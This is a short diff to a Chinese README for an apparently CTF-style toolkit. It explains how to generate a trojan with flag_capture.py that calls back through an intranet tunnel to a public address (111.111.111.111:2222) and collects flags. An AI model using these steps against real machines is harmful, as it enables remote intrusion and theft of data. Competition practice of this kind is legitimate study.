@@ -16,7 +16,8 @@ sudo apt install build-essential
 ```sh
 python3 flag_handler.py
 ```
-而后，在本地攻击机（linux）的环境下，使用flag_capture.py生成木马，在本地开启内网穿透（内网穿透的开启方法不做赘述）
+而后，在本地攻击机（linux）的环境下，使用flag_capture.py生成木马
+在本地开启内网穿透，穿透12346端口（内网穿透的开启方法不做赘述）
 假设在内网穿透的端口，将本地的127.0.0.1:12346穿透到111.111.111.111:2222，那么你应该以以下命令生成木马
 ```sh
 python3 flag_capture.py 111.111.111.111 2222
